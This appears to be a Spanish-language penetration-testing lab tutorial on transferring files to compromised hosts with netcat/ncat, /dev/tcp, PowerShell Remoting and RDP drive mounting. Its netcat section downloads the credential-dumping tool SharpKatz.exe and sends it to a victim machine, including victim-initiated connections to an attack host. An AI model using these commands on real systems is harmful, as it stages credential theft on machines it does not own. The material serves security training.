## netcat
[Netcat](https://sectools.org/tool/netcat/) (a menudo abreviado como `nc`) es una utilidad de red informática para leer y escribir en conexiones de red mediante TCP o UDP, lo que significa que podemos utilizarla para operaciones de transferencia de archivos. El Netcat original fue [lanzado](http://seclists.org/bugtraq/1995/Oct/0028.html) por Hobbit en 1995, pero no se ha mantenido a pesar de su popularidad. La flexibilidad y utilidad de esta herramienta impulsaron al Proyecto Nmap a producir [Ncat](https://nmap.org/ncat/) , una reimplementación moderna que admite proxies SSL, IPv6, SOCKS y HTTP, intermediación de conexiones y más.

## Transferencia de archivos con Netcat y Ncat
#### NetCat - Máquina comprometida - Escuchando en el puerto 8000
```js
nc -l -p 8000 > SharpKatz.exe
```
Si la máquina comprometida usa Ncat, necesitaremos especificar `--recv-only` para cerrar la conexión una vez finalizada la transferencia del archivo.


#### Ncat - Máquina comprometida - Escuchando en el puerto 8000
```js
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

Desde nuestro host de ataque, nos conectaremos a la máquina comprometida en el puerto 8000 usando Netcat y enviaremos el archivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada a Netcat. La opción `-q 0`Le indicará a Netcat que cierre la conexión una vez que finalice. De esa manera, sabremos cuándo se completó la transferencia del archivo.

#### Netcat - Host de ataque - Envío de archivos a una máquina comprometida
```js
wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Al utilizar Ncat en nuestro host atacante, podemos optar por `--send-only` en vez de `-q`. El `--send-only`flag, cuando se usa tanto en modo de conexión como de escucha, solicita a Ncat que finalice una vez que se agota su entrada. Normalmente, Ncat continuará ejecutándose hasta que se cierre la conexión de red, ya que el lado remoto puede transmitir datos adicionales. Sin embargo, con `--send-only`, no es necesario anticipar más información entrante.

#### Ncat - Host de ataque - Envío de archivos a una máquina comprometida
```js
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```
En lugar de escuchar en nuestra máquina comprometida, podemos conectarnos a un puerto de nuestro host de ataque para realizar la operación de transferencia de archivos. Este método es útil en escenarios donde hay un firewall que bloquea las conexiones entrantes. Escuchemos en el puerto 443 de nuestro Pwnbox y enviemos el archivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada a Netcat.

#### Host de ataque: envío de archivos como entrada a Netcat
```js
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Máquina comprometida Conéctese a Netcat para recibir el archivo
```js
nc 192.168.49.128 443 > SharpKatz.exe
```

Hagamos lo mismo con Ncat:
#### Host de ataque: envío de archivos como entrada a Ncat
```js
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Máquina comprometida Conéctese a Ncat para recibir el archivo
```js
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```


#### NetCat - Envío de archivos como entrada a Netcat
```js
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat: envío de archivos como entrada a Netcat
```js
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Máquina comprometida que se conecta a Netcat usando /dev/tcp para recibir el archivo
```js
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## Transferencia de archivos de sesión de PowerShell
Ya hablamos de realizar transferencias de archivos con PowerShell, pero puede haber escenarios en los que HTTP, HTTPS o SMB no estén disponibles. Si ese es el caso, podemos usar [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) , también conocido como WinRM, para realizar operaciones de transferencia de archivos.  [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) nos permite ejecutar scripts o comandos en un ordenador remoto mediante sesiones de PowerShell. Los administradores comúnmente usan PowerShell Remoting para administrar computadoras remotas en una red, y también podemos usarlo para operaciones de transferencia de archivos. De forma predeterminada, habilitar la comunicación remota de PowerShell crea un oyente HTTP y HTTPS. Los escuchas se ejecutan en los puertos predeterminados TCP/5985 para HTTP y TCP/5986 para HTTPS.  Para crear una sesión de PowerShell Remoting en una computadora remota, necesitaremos acceso administrativo, ser miembro de la `Remote Management Users`grupo, o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión. Creemos un ejemplo y transfiramos un archivo desde `DC01` a `DATABASE01` y viceversa.  Tenemos una sesión como `Administrator` en `DC01`, el usuario tiene derechos administrativos sobre `DATABASE01`y la comunicación remota de PowerShell está habilitada. Usemos Test-NetConnection para confirmar que podemos conectarnos a WinRM.

#### Desde DC01: confirme que el puerto TCP 5985 de WinRM esté abierto en DATABASE01.
```powershell
PS C:\htb> whoami
htb\administrator
PS C:\htb> hostname
DC01
```

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Debido a que esta sesión ya tiene privilegios sobre `DATABASE01`, no necesitamos especificar credenciales. En el siguiente ejemplo, se crea una sesión en la computadora remota llamada `DATABASE01` y almacena los resultados en la variable denominada `$Session`.

#### Cree una sesión remota de PowerShell en DATABASE01
```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
Podemos usar el `Copy-Item` cmdlet para copiar un archivo desde nuestra máquina local `DC01` hacia `DATABASE01` sesión que tenemos `$Session` o viceversa.

#### Copie samplefile.txt de nuestro Localhost a la sesión DATABASE01
```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copie DATABASE.txt de la sesión DATABASE01 a nuestro Localhost
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP
RDP (Protocolo de escritorio remoto) se usa comúnmente en redes Windows para acceso remoto. Podemos transferir archivos usando RDP copiando y pegando. Podemos hacer clic derecho y copiar un archivo desde la máquina Windows a la que nos conectamos y pegarlo en la sesión RDP. Si estamos conectados desde Linux, podemos usar `xfreerdp` o `rdesktop`. En el momento de escribir, `xfreerdp` y `rdesktop` permitir la copia desde nuestra máquina de destino a la sesión RDP, pero puede haber escenarios en los que esto no funcione como se esperaba. Como alternativa a copiar y pegar, podemos montar un recurso local en el servidor RDP de destino. `rdesktop` o `xfreerdp` se puede utilizar para exponer una carpeta local en la sesión RDP remota.

#### Montar una carpeta de Linux usando rdesktop
```js
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Montar una carpeta de Linux usando xfreerdp
```js
p314d0@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

